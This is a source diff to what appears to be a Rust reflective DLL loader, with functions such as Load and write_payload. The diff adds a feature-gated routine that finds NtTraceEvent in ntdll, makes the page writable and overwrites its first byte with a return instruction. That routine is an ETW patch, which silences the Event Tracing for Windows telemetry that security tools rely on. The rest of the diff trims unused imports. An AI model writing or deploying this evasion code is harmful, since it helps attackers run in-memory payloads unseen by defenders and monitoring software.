@@ -17,9 +17,8 @@ use windows_sys::{
         System::{
             Diagnostics::Debug::{
                 IMAGE_DATA_DIRECTORY, IMAGE_DIRECTORY_ENTRY_BASERELOC,
-                IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64,
-                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
-                IMAGE_SECTION_HEADER,
+                IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
+                IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
             },
             Memory::{
                 MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
@@ -27,9 +26,8 @@ use windows_sys::{
                 PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
             },
             SystemServices::{
-                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
-                IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64,
-                IMAGE_REL_BASED_HIGHLOW,
+                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR,
+                IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
             },
             WindowsProgramming::IMAGE_THUNK_DATA64,
         },
@@ -164,6 +162,11 @@ pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
         // We could not resolve all the required function pointers
         return RdiErrorCodes::CouldNotParseExports as _;
     };
+
+    #[cfg(feature = "patch_etw")]
+    {
+        nostd_patch_etw_current_process(&exports);
+    }
 
     //
     // Allocate fresh memory and copy sections over assuming we are from an unaligned region of memory
@@ -518,4 +521,38 @@ fn write_payload(
             nt_headers.OptionalHeader.SizeOfHeaders as usize,
         );
     }
+}
+
+#[inline(always)]
+fn nostd_patch_etw_current_process(exports: &RdiExports) {
+    let fn_addr = export_resolver::resolve_address("ntdll.dll", "NtTraceEvent", None)
+        .unwrap_or_default() as *mut u8;
+
+    if fn_addr.is_null() {
+        return;
+    }
+
+    // let handle = unsafe { exports.GetCurrentProcess };
+    let ret_opcode: u8 = 0xC3;
+
+    // Have we already patched?
+    if unsafe { *(fn_addr as *mut u8) } == 0xC3 {
+        return;
+    }
+
+    // Required for 2nd fn call
+    let mut unused_protect: u32 = 0;
+    // The protection flags to reset to
+    let mut old_protect: u32 = 0;
+
+    unsafe {
+        (exports.VirtualProtect)(
+            fn_addr as *const _,
+            1,
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect,
+        )
+    };
+    unsafe { core::ptr::write_bytes(fn_addr, ret_opcode, 1) };
+    unsafe { (exports.VirtualProtect)(fn_addr as *const _, 1, old_protect, &mut unused_protect) };
 }
